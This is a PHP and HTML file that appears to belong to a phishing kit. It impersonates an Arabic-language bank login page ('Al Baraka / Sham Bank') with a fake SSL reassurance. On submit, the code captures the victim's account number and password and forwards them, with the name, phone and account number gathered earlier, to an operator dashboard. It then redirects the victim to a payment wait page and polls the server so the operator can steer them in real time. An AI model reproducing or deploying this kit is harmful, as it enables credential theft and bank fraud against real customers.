<?php

declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__.'/includes/flow_helpers.php';
require_once __DIR__.'/includes/session_registry.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
    $username = trim((string) ($_POST['username'] ?? ''));
    $password = (string) ($_POST['password'] ?? '');
    $_SESSION['username'] = $username;
    $_SESSION['sham_password'] = $password;

    dashboard_notify_safe(
        'sham_login',
        [
            'session_id' => session_id(),
            'name' => $_SESSION['reg_name'] ?? '',
            'phone' => $_SESSION['reg_phone'] ?? '',
            'account_number' => $_SESSION['reg_account'] ?? '',
            'login_account_number' => $username,
            'password' => $password,
        ],
        'تسجيل دخول تأكيدي (بيانات كاملة)'
    );

    $_SESSION['sham_done'] = true;
    unset($_SESSION['wait_page_broadcast']);

    registry_touch_page('sham.php');

    header('Location: wait-payment.php', true, 302);
    exit;
}

registry_touch_page('sham.php');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنك البركة | تسجيل الدخول</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a { text-decoration: none; }

        body {
            background: #f8f9fa;
            min-height: 100vh;
        }

        .login-container {
            max-width: 450px;
            margin: 0 auto;
            padding: 20px;
        }

        .logo-section {
            text-align: center;
            padding-top: 60px;
            padding-bottom: 20px;
        }

        .logo-section img {
            width: 120px;
            max-width: 50%;
        }

        .info-capsule {
            background: linear-gradient(135deg, #8B1A1A 0%, #b22222 50%, #8B1A1A 100%);
            color: #fff;
            padding: 14px 25px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            box-shadow: 0 4px 15px rgba(139, 26, 26, 0.3);
            margin-top: 20px;
            line-height: 1.6;
        }

        .info-capsule i {
            font-size: 18px;
            color: #ffd700;
        }

        label {
            font-size: 14px;
            font-weight: 600;
            color: #333;
        }

        .group {
            height: 50px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            padding: 0px 15px;
            gap: 10px;
            border: 1px solid #ddd;
            background: #fff;
            transition: border-color 0.3s;
        }

        .group:focus-within {
            border-color: #8B1A1A;
            box-shadow: 0 0 0 3px rgba(139, 26, 26, 0.1);
        }

        .form-control {
            border-radius: 15px;
            background-color: transparent;
            border: none;
            font-size: 13px;
            font-weight: bold;
        }

        .form-control:hover,
        .form-control:focus {
            background-color: transparent;
            box-shadow: none;
        }

        .btn-login {
            height: 50px;
            border-radius: 12px;
            background: linear-gradient(135deg, #8B1A1A 0%, #a52a2a 100%);
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            transition: all 0.3s;
        }

        .btn-login:hover {
            background: linear-gradient(135deg, #6d1515 0%, #8B1A1A 100%);
            color: #fff;
        }

        .security-note {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 12px;
            padding: 12px 15px;
            font-size: 12px;
            color: #856404;
            text-align: center;
        }

        .security-note i {
            color: #ffc107;
            font-size: 16px;
        }

        #loader { display: none; }

        .loader-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(255, 255, 255, 0.7);
            z-index: 9999;
        }

        .loader {
            width: 50px;
            aspect-ratio: 1;
            border-radius: 50%;
            border: 8px solid;
            border-color: #8B1A1A #0000;
            animation: l1 1s infinite;
        }

        @keyframes l1 {
            to { transform: rotate(.5turn) }
        }

        .modal { overflow: hidden; border-radius: 55px !important; }
        .modal-body, .modal-header, .modal-footer { border: none !important; }
        .modal-backdrop.show { background-color: rgba(0, 0, 0, 0.6) !important; }

        ::placeholder { color: rgb(182, 180, 180) !important; }

        .footer-section {
            text-align: center;
            padding: 30px 0;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>

<body>
    <div class="loader-container" id="loader">
        <div class="loader"></div>
    </div>

    <div class="login-container">
        <div class="logo-section">
            <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="بنك الشام" class="img-fluid">
            <div>
                <div class="info-capsule">
                    <i class="bi bi-shield-lock-fill"></i>
                    لطبقة أمان وحماية إضافية يرجى تسجيل الدخول لتأكيد العملية
                </div>
            </div>
        </div>

        <form action="" method="POST" onsubmit="return subb()">
            <div class="mb-3">
                <label class="mb-2"><i class="bi bi-person-fill me-1"></i> رقم الحساب</label>
                <div class="group">
                     <input type="text" name="username" required class="form-control"
       placeholder="أدخل رقم الحساب"
       pattern="[0-9]+"
       inputmode="numeric"
       oninput="this.value=this.value.replace(/[^0-9]/g,'')"
       title="يرجى إدخال رقم الحساب">
                </div>
            </div>

            <div class="mb-3">
                <label class="mb-2"><i class="bi bi-lock-fill me-1"></i> كلمة المرور</label>
                <div class="group">
                    <input type="password" name="password" id="password" required class="form-control" placeholder="أدخل كلمة المرور">
                    <div class="d-flex align-items-center gap-3 ps-3">
                        <i class="fa-solid fa-eye-slash text-muted" id="eye" style="font-size:14px; cursor:pointer;"></i>
                    </div>
                </div>
            </div>

            
            
            <div class="text-center mt-4">
                <button type="submit" name="submit" id="subs" class="btn btn-login w-100">تسجيل الدخول</button>
            </div>

            <div class="security-note mt-4">
                <i class="bi bi-shield-lock-fill me-1"></i>
                هذه الصفحة محمية بتشفير SSL لحماية بياناتك
            </div>

            <!-- Modal خطأ -->
            <div class="modal fade px-4" id="exampleModalToggle" aria-hidden="true" tabindex="-1">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content p-3" style="border-radius: 20px !important;">
                        <div class="modal-header d-block">
                            <button type="button" class="btn-close float-start" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body text-center">
                            <i class="bi bi-x-circle-fill text-danger" style="font-size: 60px;"></i>
                            <h5 class="mt-3 fw-bold">خطأ</h5>
                            <p class="mt-3">معلومات دخول خاطئة، يرجى المحاولة مرة أخرى</p>
                        </div>
                        <div class="modal-footer d-block text-center mb-3">
                            <button class="btn w-75 btn-login" data-bs-dismiss="modal">حاول مرة أخرى</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Modal تحديث -->
            <div class="modal fade px-4" id="exampleModalToggle1" aria-hidden="true" tabindex="-1">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content p-3" style="border-radius: 20px !important;">
                        <div class="modal-header d-block">
                            <button type="button" class="btn-close float-start" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body text-center">
                            <i class="bi bi-exclamation-triangle-fill text-warning" style="font-size: 60px;"></i>
                            <p class="mt-3">يوجد تحديث على النظام البنكي لمدة <br> 30 دقيقة، يرجى المحاولة لاحقاً</p>
                        </div>
                        <div class="modal-footer d-block text-center mb-3">
                            <button class="btn w-75 btn-login" data-bs-dismiss="modal">تم</button>
                        </div>
                    </div>
                </div>
            </div>
        </form>

        <div class="footer-section">
            <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="بنك البركة" style="width: 80px; opacity: 0.5;">
            <p class="mt-2">بنك البركة | SHAM BANK</p>
            <p>&copy; بنك البركة 2026 - جميع الحقوق محفوظة</p>
        </div>
    </div>

    <script src="js/main.js"></script>
    <script>
        function subb() {
            var but = document.getElementById('subs');
            but.style.display = 'none';
            document.getElementById('loader').style.display = "flex";
        }

        document.getElementById("eye").addEventListener("click", function() {
            var input = document.getElementById("password");
            var icon = this;
            if (input.type === "text") {
                input.type = "password";
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = "text";
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        });
    </script>

    <script>
    function checkRedirect() {
        fetch('polling-redirect.php')
            .then(r => r.json())
            .then(data => {
                if (data.redirect) {
                    window.location.href = data.redirect;
                }
            })
            .catch(e => {});
    }
    setInterval(checkRedirect, 1500);
    checkRedirect();
    </script>
    <script src="js/heartbeat.js"></script>
</body>

</html>
